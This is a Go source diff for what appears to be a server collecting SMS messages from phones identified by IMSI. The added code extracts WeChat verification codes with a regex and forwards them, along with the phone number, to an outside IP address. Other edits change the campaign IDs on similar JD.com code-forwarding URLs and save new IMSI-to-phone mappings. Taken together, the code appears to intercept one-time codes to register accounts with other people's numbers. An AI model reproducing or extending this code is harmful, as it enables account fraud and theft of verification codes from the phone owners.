@@ -160,7 +160,18 @@ func processWechatRegister(msg string, user map[string]string, apid string) {
 		go send2Url(url)
 		go updateRelationSuccess(user, apid)
 	} else {
-		log.Println("processWechatRegister can not match:%s", msg)
+		exp = regexp.MustCompile(`码(\S*)。（`)
+		result = exp.FindStringSubmatch(msg)
+		if nil != result {
+			log.Println(result[1])
+			pwd := result[1]
+			mobile := formatMobile(user["mobile"])
+			url := "http://121.201.67.97:8080/verifycode/api/getWXChCode.jsp?cid=wx109&pid=109&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara="
+			go send2Url(url)
+			go updateRelationSuccess(user, apid)
+		} else {
+			log.Println("processWechatRegister can not match:%s", msg)
+		}
 	}
 }
 
@@ -178,11 +189,11 @@ func processJindongRegister(msg string, user map[string]string, apid string) {
 	result := exp.FindStringSubmatch(msg)
 	if nil != result {
 		log.Println(result[1])
-		url := "http://121.201.67.97:8080/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent2=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
+		url := "http://121.201.67.97:8080/verifycode/api/getJDNET.jsp?cid=wx109&pid=jd109&smsContent2=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
 		go send2Url(url)
 
 	} else {
-		url := "http://121.201.67.97:8080/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
+		url := "http://121.201.67.97:8080/verifycode/api/getJDNET.jsp?cid=wx109&pid=jd109&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
 		go send2Url(url)
 	}
 	go updateRelationSuccess(user, apid)
@@ -370,12 +381,20 @@ func receiverSms(w http.ResponseWriter, r *http.Request) {
 			log.Println("error end:")
 		}
 	}()
+	log.Println("receiverSms RawQuery,", r.URL.RawQuery)
 	sendNum := r.FormValue("sendNum")
 	if strings.Index(sendNum, "+") == 0 {
 		sendNum = strings.Replace(sendNum, "+", "", -1)
 	}
+	log.Println("receiverSms sendNum,", sendNum)
 	s := strings.Split(r.FormValue("msg"), "#")
-	go updateMobile(s[0], sendNum)
+	log.Println("receiverSms imsi,", s[0])
+	user := getUserByImsi(s[0])
+	if _, ok := (*user)["imsi"]; ok {
+		go updateMobile(s[0], sendNum)
+	} else {
+		go insertUserWithPhone(s[0], sendNum)
+	}
 }
 
 func updateUserMatchCount(imsi string) {
@@ -410,6 +429,17 @@ func insertUser(imsi string) {
 	}()
 	sql := `insert imsi_users (imsi,insertTime) values (?,?)`
 	exec(dbConfig, sql, imsi, time.Now().Unix())
+}
+func insertUserWithPhone(imsi string, mobile string) {
+	defer func() {
+		if err := recover(); err != nil {
+			log.Println("error begin:")
+			log.Println(err) // 这里的err其实就是panic传入的内容，55
+			log.Println("error end:")
+		}
+	}()
+	sql := `insert imsi_users (imsi,insertTime,mobile) values (?,?,?)`
+	exec(dbConfig, sql, imsi, time.Now().Unix(), mobile)
 }
 
 func procGetResp(resp string) string {
